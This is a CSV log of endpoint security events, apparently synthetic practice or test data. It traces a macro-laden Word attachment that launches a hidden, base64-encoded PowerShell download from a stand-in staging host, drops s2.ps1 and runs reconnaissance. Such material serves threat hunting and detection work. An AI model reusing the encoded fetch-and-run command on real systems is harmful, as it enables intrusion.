Timestamp,DeviceName,ActionType,FileName,FolderPath,ProcessCommandLine,SHA256,AccountName,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessId,InitiatingProcessAccountName,ProcessId,RemoteIP,RemoteUrl,RemotePort,ReportId
2026-05-20T08:30:15Z,WS-MARKETING-08,ProcessCreated,svchost.exe,C:\Windows\System32,svchost.exe -k netsvcs,A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2,SYSTEM,services.exe,C:\Windows\System32\services.exe,612,SYSTEM,4007,,,,1001
2026-05-20T08:33:15Z,WS-MARKETING-08,ProcessCreated,explorer.exe,C:\Windows,explorer.exe,B0B1B2B3B4B5B0B1B2B3B4B5B0B1B2B3B4B5B0B1B2B3B4B5B0B1B2B3B4B5B0B1,jbecker,userinit.exe,C:\Windows\System32\userinit.exe,894,jbecker,4014,,,,1002
2026-05-20T08:37:15Z,WS-FINANCE-04,ProcessCreated,explorer.exe,C:\Windows,explorer.exe,B0B1B2B3B4B5B0B1B2B3B4B5B0B1B2B3B4B5B0B1B2B3B4B5B0B1B2B3B4B5B0B1,jdoe,userinit.exe,C:\Windows\System32\userinit.exe,901,jdoe,4021,,,,1003
2026-05-20T08:38:15Z,SRV-FILES-01,ProcessCreated,svchost.exe,C:\Windows\System32,svchost.exe -k LocalServiceNetworkRestricted,A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2,SYSTEM,services.exe,C:\Windows\System32\services.exe,612,SYSTEM,4028,,,,1004
2026-05-20T08:40:15Z,WS-MARKETING-08,ProcessCreated,OUTLOOK.EXE,C:\Program Files\Microsoft Office\root\Office16,OUTLOOK.EXE /recycle,0011223344550011223344550011223344550011223344550011223344550011,jbecker,explorer.exe,C:\Windows\explorer.exe,3412,jbecker,4035,,,,1005
2026-05-20T09:05:15Z,WS-MARKETING-08,ProcessCreated,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16,"WINWORD.EXE /n ""C:\Users\jbecker\Downloads\Q2_Marketing_Plan.docm""",B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8D9E0F1A2B7C8,jbecker,OUTLOOK.EXE,OUTLOOK.EXE /recycle,4035,jbecker,4042,,,,1006
2026-05-20T09:05:57Z,WS-MARKETING-08,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jbecker,WINWORD.EXE,"WINWORD.EXE /n ""C:\Users\jbecker\Downloads\Q2_Marketing_Plan.docm""",4042,jbecker,4049,,,,1007
2026-05-20T09:06:09Z,WS-MARKETING-08,NetworkConnectionEvents,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0E1F2A3B4C9D0,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4049,198.51.100.42,evil-staging.example,443,1008
2026-05-20T09:06:27Z,WS-MARKETING-08,FileCreated,s2.ps1,C:\Users\jbecker\AppData\Local\Temp,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,D1E2F3A4B5C6D1E2F3A4B5C6D1E2F3A4B5C6D1E2F3A4B5C6D1E2F3A4B5C6D1E2,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4049,,,,1009
2026-05-20T09:06:35Z,WS-MARKETING-08,ProcessCreated,cmd.exe,C:\Windows\System32,cmd.exe /c whoami /all,E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4A5B6C7D8E3F4,jbecker,powershell.exe,powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgA0ADIALwBzADIA,4049,jbecker,4056,,,,1010
